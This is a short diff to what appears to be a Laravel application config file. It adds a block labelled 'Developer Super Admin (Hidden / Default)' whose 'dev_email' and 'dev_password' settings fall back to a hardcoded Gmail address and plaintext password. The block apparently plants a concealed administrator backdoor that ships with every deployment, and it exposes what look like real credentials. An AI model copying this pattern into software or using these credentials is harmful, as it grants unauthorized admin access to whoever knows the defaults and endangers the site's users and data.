@@ -123,4 +123,12 @@ return [
         'store' => env('APP_MAINTENANCE_STORE', 'database'),
     ],
 
+    /*
+    |--------------------------------------------------------------------------
+    | Developer Super Admin (Hidden / Default)
+    |--------------------------------------------------------------------------
+    */
+    'dev_email' => env('DEV_EMAIL', 'needleproject240696@gmail.com'),
+    'dev_password' => env('DEV_PASSWORD', 'Aku240696@'),
+
 ];
